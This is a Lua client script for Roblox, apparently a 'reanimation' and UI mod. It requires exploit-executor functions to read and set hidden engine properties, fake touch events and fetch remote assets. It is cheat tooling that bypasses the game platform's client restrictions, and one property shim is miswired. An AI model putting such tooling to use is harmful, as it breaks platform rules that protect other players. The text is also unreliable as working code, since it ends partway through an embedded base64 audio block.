--[[
 ...    :::::        ::        ::        ::        ::        ::        
 ;;     ;;;;;;       ;;;       ;;;       ;;;       ;;;       ;;;       
[['     [[[[[[[cc,,. [[[[cc,,. [[[[cc,,. [[[[cc,,. [[[[cc,,. [[[[cc,,. 
$$      $$$$$$"""$$$ $$$"""$$$ $$$"""$$$ $$$"""$$$ $$$"""$$$ $$$"""$$$ 
88    .d888888   "88o888   "88o888   "88o888   "88o888   "88o888   "88o
 "YmmMMMM""MMM    YMMMMM    YMMMMM    YMMMMM    YMMMMM    YMMMMM    YMM
       "DREAMS WILL NEVER COME TRUE UNTIL YOU ACTUALLY MAKE IT."       

       Code:    STEVETHEREALONE
                BoredGal (mostly patches..)
       GFX:     STEVETHEREALONE
                AALib
                some random generators
       Music:   Dubmood
                4mat
                MASTER BOOT RECORD

Thou shalth not steal. Point at this source if you used a snippet here.
]]

if _G.UhhhhhhLoaded then return end
_G.UhhhhhhLoaded = true

local UhhhhhhVersion = "1.0.9 BETA"

local Debris = cloneref(game:GetService("Debris"))
local CoreGui = cloneref(game:GetService("CoreGui"))
local Players = cloneref(game:GetService("Players"))
local VRService = cloneref(game:GetService("VRService"))
local RunService = cloneref(game:GetService("RunService"))
local StarterGui = cloneref(game:GetService("StarterGui"))
local GuiService = cloneref(game:GetService("GuiService"))
local HttpService = cloneref(game:GetService("HttpService"))
local TextService = cloneref(game:GetService("TextService"))
local TweenService = cloneref(game:GetService("TweenService"))
local TextChatService = cloneref(game:GetService("TextChatService"))
local UserInputService = cloneref(game:GetService("UserInputService"))
local AvatarEditorService = cloneref(game:GetService("AvatarEditorService"))
local ContextActionService = cloneref(game:GetService("ContextActionService"))

-- pixel font used by the whole UI (change this one line to switch fonts)
local UIFont = Enum.Font.Arcade

local Util = {}

Util.RandomString = function(length)
	length = length or math.random(32, 256)
	local str = ""
	for _=1, length do
		str ..= string.char(math.random(32, 126))
	end
	return str
end
Util.DeepcopyTable = function(t)
	local c = {}
	for k, v in pairs(t) do
		if type(v) == "table" then
			v = Util.DeepcopyTable(v)
		end
		c[k] = v
	end
	return c
end
Util.Notify = function(text)
	StarterGui:SetCore("SendNotification", {
		Title = "Uhhhhhh",
		Text = text,
		Duration = 5
	})
end

cloneref = cloneref or function(o) return o end
getcustomasset = getcustomasset or getsynasset
gethiddengui = get_hidden_gui or gethui
request = request or (http and http.request)

local function ismissing(func)
	return not func or type(func) ~= "function"
end
do
	local function diefatal(msg)
		Util.Notify("Executor not supported. " .. msg)
		_G.UhhhhhhLoaded = nil
		error("fatal error cant start")
	end
	if ismissing(request) then
		diefatal("Missing `request` or `http.request` function!")
	end
	if ismissing(getcustomasset) then
		diefatal("Missing `getcustomasset` or `getsynasset` function!")
	end
	if ismissing(readfile)
		or ismissing(writefile)
		or ismissing(delfile)
		or ismissing(isfile)
		or ismissing(isfolder)
		or ismissing(makefolder)
		or ismissing(listfiles) then
		diefatal("Missing some filesystem functions!")
	end
	if ismissing(firetouchinterest) then
		diefatal("Missing `firetouchinterest` function!")
	end
	--if ismissing(replicatesignal) then
	--	diefatal("Missing `replicatesignal` function!")
	--end
	if ismissing(gethiddenproperty) then
		if ismissing(setscriptable) then
			diefatal("Missing `gethiddenproperty` and `setscriptable` function!")
		elseif ismissing(isscriptable) then
			gethiddenproperty = function(inst, prop, val)
				setscriptable(inst, prop, true)
				local val = inst[prop]
				setscriptable(inst, prop, false)
				return val
			end
		else
			gethiddenproperty = function(inst, prop, val)
				local was = isscriptable(inst, prop)
				if not was then setscriptable(inst, prop, true) end
				local val = inst[prop]
				if not was then setscriptable(inst, prop, false) end
				return val
			end
		end
	end
	if ismissing(sethiddenproperty) then
		if ismissing(setscriptable) then
			diefatal("Missing `sethiddenproperty` and `setscriptable` function!")
		elseif ismissing(isscriptable) then
			sethiddenproperty = function(inst, prop, val)
				setscriptable(inst, prop, true)
				inst[prop] = val
				setscriptable(inst, prop, false)
			end
		else
			gethiddenproperty = function(inst, prop, val)
				local was = isscriptable(inst, prop)
				if not was then setscriptable(inst, prop, true) end
				inst[prop] = val
				if not was then setscriptable(inst, prop, false) end
			end
		end
	end
	--if ismissing(hookmetamethod) or ismissing(hookfunction) then
	--	diefatal("Missing `hookmetamethod` and `hookfunction` function!")
	--end
	local loadstringreturn = false
	local val = math.random(-65536, 65536)
	local _, func = pcall(loadstring, "return " .. val)
	if func then
		local s, val2 = pcall(func)
		if s and val == val2 then
			loadstringreturn = true
		end
	end
	if not loadstringreturn then
		diefatal("`loadstring` makes a function that does not return values!")
	end
	if not ismissing(isfile) then
		local s, e = pcall(isfile, Util.RandomString(32))
		if s and e then
			-- stupid executor
			isfile = function(path)
				local s, e = pcall(readfile, path)
				return not not (s and e)
			end
		end
	else
		-- THIS LITERALLY SHOULDNT HAPPEN
		diefatal("T-this one shouldn't happen!")
	end
end

-- WILL THIS FIX CRASHES IDK ????????
local pcall = function(func, ...)
	return pcall(function(...)
		return func(...)
	end, ...)
end
local xpcall = function(func, ...)
	return xpcall(function(...)
		return func(...)
	end, ...)
end
local b_getfenv = getfenv

local Player = Players.LocalPlayer

if not game:IsLoaded() then
	local notLoaded = Instance.new("Message")
	xpcall(function()
		notLoaded.Parent = CoreGui
	end, function()
		notLoaded.Parent = workspace
	end)
	notLoaded.Text = "Uhhhhhh is waiting for the game to load"
	game.Loaded:Wait()
	for i=1, 60 do
		while task.wait() > 1 / 10 do end
	end
	notLoaded:Destroy()
end

local Camera = workspace.CurrentCamera
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
	local newCamera = workspace.CurrentCamera
	if newCamera ~= nil then
		Camera = newCamera
	end
end)
Util._scrsiz = Vector2.new(512, 512)
Util.GetScreenSize = function()
	if Camera ~= nil then
		Util._scrsiz = Camera.ViewportSize
	end
	return Util._scrsiz
end
Util.LoopedHSV = function(h, s, v)
	h %= 1
	s = math.clamp(s, 0, 1)
	v = math.clamp(v, 0, 1)
	return Color3.fromHSV(h, s, v)
end
Util.Instance = function(cl, p)
	local i = Instance.new(cl)
	i.Name = Util.RandomString()
	i.Parent = p
	return i
end
Util.LinkDestroyI2C = function(a, b)
	a.Destroying:Once(function()
		b:Disconnect()
	end)
end
Util.LinkDestroyI2I = function(a, b)
	Util.LinkDestroyI2C(b, a.Destroying:Once(function()
		task.defer(b.Destroy, b)
	end))
end
Util.ClearAllChildrenGui = function(a)
	for _,v in a:GetChildren() do
		if v:IsA("GuiObject") then
			v:Destroy()
		end
	end
end
Util.GetTransparency = function(part)
	return 1 - (1 - part.Transparency) * (1 - part.LocalTransparencyModifier)
end
Util.ScaleCFrame = function(cf, scale)
	return cf + cf.Position * (scale - 1)
end
Util.IsGuiVisible = function(guiObject)
	if not guiObject or not guiObject:IsA("GuiObject") then return false end
	while guiObject do
		if not guiObject.Visible then
			return false
		end
		guiObject = guiObject:FindFirstAncestorWhichIsA("GuiObject")
	end
	return true
end
Util.IsGuiInteractable = function(guiObject)
	if not guiObject or not guiObject:IsA("GuiObject") then return false end
	while guiObject do
		if not guiObject.Visible or not guiObject.Interactable then
			return false
		end
		guiObject = guiObject:FindFirstAncestorWhichIsA("GuiObject")
	end
	return true
end
Util.WillGuiSinkInput = function(guiObject)
	return Util.IsGuiInteractable(guiObject) and (guiObject.Active or guiObject:IsA("GuiButton"))
end
Util.UDim2ToVector2Scale = function(x)
	return Vector2.new(x.X.Scale, x.Y.Scale)
end
Util.UDim2ToVector2Offset = function(x)
	return Vector2.new(x.X.Offset, x.Y.Offset)
end
Util.Vector2ToUDim2Scale = function(x)
	return UDim2.fromScale(x.X, x.Y)
end
Util.Vector2ToUDim2Offset = function(x)
	return UDim2.fromOffset(x.X, x.Y)
end
Util.ForceTextSize = function(inst)
	if inst:IsA("TextLabel") then
		local original = inst.TextSize
		local conn conn = RunService.PreRender:Connect(function()
			local size = GuiService.PreferredTextSize.Name
			if size == "Medium" then
				inst.TextSize = original
			elseif size == "Large" then
				inst.TextSize = original - 4
			elseif size == "Larger" then
				inst.TextSize = original - 9
			elseif size == "Largest" then
				inst.TextSize = original - 14
			end
		end)
		Util.LinkDestroyI2C(inst, conn)
	end
end
Util.ShrinkToFit = function(label, maxsize)
	label.TextScaled = true
	local limit = Instance.new("UITextSizeConstraint")
	limit.Name = Util.RandomString()
	limit.MaxTextSize = maxsize
	limit.MinTextSize = 8
	limit.Parent = label
end
Util.QueryPlayerSelector = function(query, excludespeaker)
	if #query == 0 then return end
	query = query:lower()
	local t = {}
	for _,player in Players:GetPlayers() do
		if player ~= Player or not excludespeaker then
			local a = player.DisplayName:lower():find(query)
			local b = player.Name:lower():find(query)
			if a then table.insert(t, {player, 1, a}) end
			if b then table.insert(t, {player, 0, b}) end
		end
	end
	table.sort(t, function(a, b)
		if a[2] == b[2] then
			return a[3] < b[3]
		end
		return a[2] < b[2]
	end)
	if t[1] then
		return t[1][1]
	end
	return nil
end

local IsUhhhhhhFullyLoaded = false

local SCREENGUI = Util.Instance("ScreenGui")
SCREENGUI.IgnoreGuiInset = true
SCREENGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
SCREENGUI.ClipToDeviceSafeArea = false
SCREENGUI.ResetOnSpawn = false
SCREENGUI.ScreenInsets = Enum.ScreenInsets.None
SCREENGUI.DisplayOrder = 2147483647
if gethiddengui then
	SCREENGUI.Parent = gethiddengui()
else
	SCREENGUI.Parent = CoreGui
end

local UIMainFrame = Util.Instance("Frame", SCREENGUI)
UIMainFrame.AnchorPoint = Vector2.new(0, 0)
UIMainFrame.Position = UDim2.new(0, 0, 0, 0)
UIMainFrame.Size = UDim2.new(1, 0, 1, 0)
UIMainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
UIMainFrame.BackgroundTransparency = 1
UIMainFrame.BorderSizePixel = 0
UIMainFrame.ZIndex = 2147483647

local SaveData = {}
do
	pcall(makefolder, "UhhhhhhReanim")
	pcall(writefile, "UhhhhhhReanim/.nomedia", "")
	local SaveDataFilename = "UhhhhhhReanim/tree.ehehetilde"
	local s, data = pcall(readfile, SaveDataFilename)
	if s and data then
		s, data = pcall(HttpService.JSONDecode, HttpService, data)
		if s and data then
			SaveData = data
		else
			pcall(writefile, SaveDataFilename, "{}")
		end
	else
		pcall(writefile, SaveDataFilename, "{}")
	end
	task.spawn(function()
		local odata = nil
		local savefailwarn = false
		while true do
			task.wait()
			local s, data = pcall(HttpService.JSONEncode, HttpService, SaveData)
			if s then
				odata = odata or data
				if odata ~= data then
					local s, err = pcall(writefile, SaveDataFilename, data)
					if s then
						savefailwarn = false
						odata = data
					else
						if not savefailwarn then
							Util.Notify("Failed to write tree.ehehetilde (your save file)")
							savefailwarn = true
						end
					end
					task.wait(5)
				end
			else
				if not savefailwarn then
					Util.Notify("Failed to write tree.ehehetilde (your save file)")
					savefailwarn = true
				end
			end
		end
	end)
	pcall(makefolder, "UhhhhhhReanim/Assets")
	pcall(makefolder, "UhhhhhhReanim/Modules")
	pcall(makefolder, "UhhhhhhReanim/Muzik")
	pcall(makefolder, "UhhhhhhReanim/BuiltinModules")
	pcall(makefolder, "UhhhhhhReanim/Content")
	pcall(makefolder, "UhhhhhhReanim/Content/Anims")
	pcall(makefolder, "UhhhhhhReanim/Content/Sounds")
	pcall(makefolder, "UhhhhhhReanim/Content/Images")
	pcall(makefolder, "UhhhhhhReanim/Content/Models")
	pcall(makefolder, "UhhhhhhReanim/Content/Unknown")
end

do
	local CDNVersion = 3
	local AllFileNames = {
		"dm_afterburner.ft2.mp3",
		"4m_brokenheart.ft2.mp3",
		"dm_change.ft2.mp3",
		"dm_deadscene2024.ft2.mp3",
		"dm_deadscene2024alt.ft2.mp3",
		"dm_e1m777.ft2.mp3",
		"dm_haze.ft2.mp3",
		"dm_haze2.ft2.mp3",
		"dm_iostesso.ft2.mp3",
		"dm_keygen18.ft2.mp3",
		"dm_keygen19.ft2.mp3",
		"dm_keygen20.ft2.mp3",
		"dm_keygen21.ft2.mp3",
		"dm_keygen21alt.ft2.mp3",
		"dm_keygen22.ft2.mp3",
		"dm_keygen23.ft2.mp3",
		"dm_keygen3.ft2.mp3",
		"dm_keygen30.ft2.mp3",
		"dm_keygen31.ft2.mp3",
		"dm_keygen8.ft2.mp3",
		"dm_laparade.ft2.mp3",
		"dm_reztro4.ft2.mp3",
		"dm_robotadventure.ft2.mp3",
		"dm_unaseraariccione.ft2.mp3",
		"fr_keygen31.ft2.mp3",
		"fr_brokenheart.ft2.mp3",
		"lightinursoul.graphic.png",
		"letriangul.graphic.png",
	}
	local redownloadeverything = SaveData.CDNVersion ~= CDNVersion
	local theresassetsmissing = redownloadeverything
	for _,rfile in AllFileNames do
		local fil = "UhhhhhhReanim/Assets/" .. rfile
		local s, d = pcall(isfile, fil)
		if not (s and d) then
			theresassetsmissing = true
		end
	end
	if theresassetsmissing then
		local downloaded = 0
		local skipped = 0
		local assetsdownload = 0
		local downloadfile = function(meta)
			local fil = "UhhhhhhReanim/Assets/" .. meta.name
			if not redownloadeverything then
				local s, d = pcall(isfile, fil)
				if s and d then
					downloaded += 1
					return
				end
			end
			if not pcall(function()
				writefile(fil, game:HttpGet(meta.download_url))
			end) then skipped += 1 end
			downloaded += 1
		end
		local Downloading = Util.Instance("TextLabel", UIMainFrame)
		Downloading.AnchorPoint = Vector2.new(0.5, 0.5)
		Downloading.Position = UDim2.new(0.5, 0, 0.5, 0)
		Downloading.Size = UDim2.new(1, 0, 0, 0)
		Downloading.BackgroundColor3 = Color3.new(0, 0, 0)
		Downloading.BackgroundTransparency = 0.2
		Downloading.ClipsDescendants = true
		Downloading.BorderSizePixel = 0
		Downloading.TextColor3 = Color3.new(1, 1, 1)
		Downloading.TextSize = 20
		Downloading.Font = UIFont
		Downloading.Text = "Fetching Assets metadata..."
		Util.ForceTextSize(Downloading)
		TweenService:Create(Downloading, TweenInfo.new(0.5), {
			Size = UDim2.new(1, 0, 0, 32)
		}):Play()
		task.wait(0.5)
		local s, assetsof = pcall(game.HttpGet, game, "https://api.github.com/repos/STEVE-916-create/Uhhhhhh/contents/uiassets/")
		if s and assetsof then
			s, assetsof = pcall(HttpService.JSONDecode, HttpService, assetsof)
			if s and assetsof then
				for i,file in assetsof do
					if not table.find(AllFileNames, file.name) then
						continue
					end
					assetsdownload += 1
					task.spawn(downloadfile, file)
				end
				repeat
					Downloading.Text = `Downloading assets {downloaded}/{assetsdownload}... ({skipped} skipped)`
					Downloading.BackgroundColor3 = Color3.new(0, 0, 0)
					task.wait()
				until downloaded == assetsdownload
				Downloading.Text = "Download complete! \\(^o^)/"
				Downloading.BackgroundColor3 = Color3.new(0, 1, 0)
				theresassetsmissing = false
			end
		end
		SaveData.CDNVersion = CDNVersion
		if theresassetsmissing then
			Downloading.Text = "Asset downloading failed. 3:"
			Downloading.BackgroundColor3 = Color3.new(1, 0, 0)
		end
		TweenService:Create(Downloading, TweenInfo.new(0.5), {
			Size = UDim2.new(1, 0, 0, 0),
			BackgroundColor3 = Color3.new(0, 0, 0),
		}):Play()
		task.wait(0.5)
		Downloading:Destroy()
	end
end

Util.GetCDNAsset = function(filename)
	local path = "UhhhhhhReanim/Assets/" .. filename
	local s, id = pcall(isfile, path)
	if s and id then
		s, id = pcall(getcustomasset, path)
		if s then return id end
	end
	return ""
end

Util.MakeTriforce = function(tris, color, dur)
	dur = dur or 8
	local function CreateTriangle(parent, radius, width, rotation, color)
		local height = (math.sqrt(3) / 2) * width
		local pivot = Util.Instance("Frame", parent)
		pivot.AnchorPoint = Vector2.new(0.5, 0.5)
		pivot.Position = UDim2.new(0.5, 0, 0.5, 0)
		pivot.Size = UDim2.new(1, 0, 1, 0)
		pivot.BackgroundTransparency = 1
		pivot.BorderSizePixel = 0
		pivot.Rotation = rotation
		local tri = Util.Instance("ImageLabel", pivot)
		tri.AnchorPoint = Vector2.new(0.5, 1)
		tri.Position = UDim2.new(0.5, 0, 0.5 - radius, 0)
		tri.Size = UDim2.new(width, 0, height, 0)
		tri.BackgroundTransparency = 1
		tri.BorderSizePixel = 0
		tri.Image = Util.GetCDNAsset("letriangul.graphic.png")
		local grey = math.max(color.R, color.G, color.B) * 0.5
		tri.ImageColor3 = Color3.new(grey, grey, grey)
		TweenService:Create(tri, TweenInfo.new(dur, Enum.EasingStyle.Linear), {
			ImageColor3 = color
		}):Play()
	end
	local radius = 0.1
	local pivot = Util.Instance("Frame")
	pivot.AnchorPoint = Vector2.new(0.5, 0.5)
	pivot.Position = UDim2.new(0.5, 0, 0.5, 0)
	pivot.BackgroundTransparency = 1
	pivot.BorderSizePixel = 0
	local width = 2 * radius * math.sin(math.pi / tris) * 2
	for i=1, tris do
		CreateTriangle(pivot, radius, width, (i / tris) * 360, color)
	end
	return pivot
end
Util.MakeText = function(text)
	text = text:upper()
	local ls = "BCDEIKOPQRSTUVYZ\\_`N^MJ"
	local lt = ""
	-- !, ", #, $, %, &, ', (, ), *, +, ,, -, ., /
	lt ..= "DDDDD@DFF@@@@@FSFSFSF@@@@@@@@@@@@@@EMMUKKTDD@@@@@DEEEEEDDBBBBBD@@@@@@@@@@@@@@@@@@@DE@@@G@@@@@@@@@DABBDEEI"
	-- numbers
	lt ..= "GJJJJJGDVDDDDSGJAGIISRAAGAARWJJSAAASIIRAARGIIRJJGSAABBDDGJJGJJGGJJHAAG"
	-- :, ;, <, =, >, ?, @
	lt ..= "@DD@DD@@DD@DE@@BDEDB@@@G@G@@@EDBDE@GJABD@D@@@@@@@"
	-- capital letters
	lt ..= "DFJSJJJRJJRJJRGJIIIJGRJJJJJRSIIRIISSIIRIIIHIILJJHJJJSJJJGDDDDDGAAAAAJHJKMOMKJIIIIIISJQNJJJJJJPNLJJGJJJJJGRJJRIIIGJJJNGCRJJRMKJGJIGAJGSDDDDDDJJJJJJGJJJJJFDJJJNQJJJJFDFJJJJFDDDDSABDEIS"
	local pixs = {}
	local totalsize = 0
	for i=0, 6 do
		local row = {}
		for j=1, text:len() do
			local c = text:byte(j, j)
			local w = 0
			if c ~= 0x20 then
				local k = (c - 33) * 7 + i
				w = lt:byte(k + 1, k + 1)
				if w ~= nil and w > 64 then
					w = ls:byte(w - 64, w - 64) - 65
				else
					w = 0
				end
			end
			for k=0, 5 do
				local h = (j - 1) * 6 + (4 - k)
				totalsize = math.max(totalsize, h + 1)
				local p = (w // math.pow(2, k)) % 2
				if p > 0 then
					row[h] = true
				end
			end
		end
		pixs[i] = row
	end
	local pivot = Util.Instance("Frame")
	pivot.AnchorPoint = Vector2.new(0.5, 0.5)
	pivot.Position = UDim2.new(0.5, 0, 0.5, 0)
	pivot.Size = UDim2.new(0, totalsize, 0, 7)
	pivot.BackgroundTransparency = 1
	pivot.BorderSizePixel = 0
	for i=0, 6 do
		local row = pixs[i]
		local olde = nil
		local olds = 0
		for j=0, totalsize - 1 do
			local pix = row[j]
			if pix == true then
				if olde ~= nil then
					olds += 1
					olde.Size = UDim2.new(olds / totalsize, 0, 1 / 7, 0)
				else
					olde = Util.Instance("Frame", pivot)
					olde.AnchorPoint = Vector2.new(0, 0)
					olde.Position = UDim2.new(j / totalsize, 0, i / 7, 0)
					olde.Size = UDim2.new(1 / totalsize, 0, 1 / 7, 0)
					olde.BackgroundTransparency = 1
					olde.BorderSizePixel = 0
					olds = 1
				end
			else
				olde = nil
				olds = 0
			end
		end
	end
	return pivot
end
Util.SetTextColor = function(text, color, tran)
	for _,v in text:GetChildren() do
		v.BackgroundColor3 = color
		v.BackgroundTransparency = tran
	end
end

local UISound = {}

UISound.Music = Util.Instance("Sound", UIMainFrame)
UISound.Music.Looped = false
UISound.Music.PlaybackRegionsEnabled = false
UISound.Music.Volume = 1
UISound.Music.PlaybackSpeed = 1

local MusicPlayer = {}
-- the UI music list only has this one song; put the file in UhhhhhhReanim/Muzik/
MusicPlayer.Database = {
	{"UhhhhhhReanim/Muzik/Never_Gonna_Give_You_Up.mp3", "Never Gonna Give You Up"},
}
UISound.Music.Name = "None"
MusicPlayer.Switching = false
MusicPlayer.Last = 1
MusicPlayer.PlayMusic = function(i)
	if #MusicPlayer.Database == 0 then return end
	if MusicPlayer.Switching then return end
	MusicPlayer.Switching = true
	local last = MusicPlayer.LastMusic
	if not i then
		i = last
		while i == last do
			i = math.random(1, #MusicPlayer.Database)
			if #MusicPlayer.Database <= 1 then break end
			task.wait()
		end
	end
	MusicPlayer.LastMusic = i
	local hi = MusicPlayer.Database[i]
	local soundid, soundname = hi[1], hi[2]
	local s, id = pcall(isfile, soundid)
	if s and id then
		s, id = pcall(getcustomasset, soundid)
		if s then
			soundid = id
		else
			soundid = ""
		end
	else
		soundid = ""
	end
	if #soundid == 0 then
		MusicPlayer.Switching = false
		MusicPlayer.Failures = (MusicPlayer.Failures or 0) + 1
		if MusicPlayer.Failures > #MusicPlayer.Database * 2 then
			MusicPlayer.Failures = 0
			return
		end
		return MusicPlayer.PlayMusic()
	end
	MusicPlayer.Failures = 0
	UISound.Music.SoundId = soundid
	UISound.Music.Name = soundname
	UISound.Music:Stop()
	task.wait()
	UISound.Music.TimePosition = 0
	task.wait()
	UISound.Music:Play()
	task.wait()
	MusicPlayer.Switching = false
end
UISound.Music.Ended:Connect(function()
	MusicPlayer.PlayMusic()
end)

-- ===== embedded retro intro track =====
-- 9 s chiptune/synthwave made to follow the intro animation (CRT on, BIOS beeps, build-up,
-- drop when the scene shows up, glitch hits, READY ding, whiteout riser). It is written to
-- UhhhhhhReanim/Assets/ the first time the script runs, so there is nothing to copy by hand.
local GetIntroTrackAsset
do
	local IntroTrackFile = "UhhhhhhReanim/Assets/intro_retro_v1.mp3"
	local IntroTrackSize = 108818
	local IntroTrackB64 = [==[
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
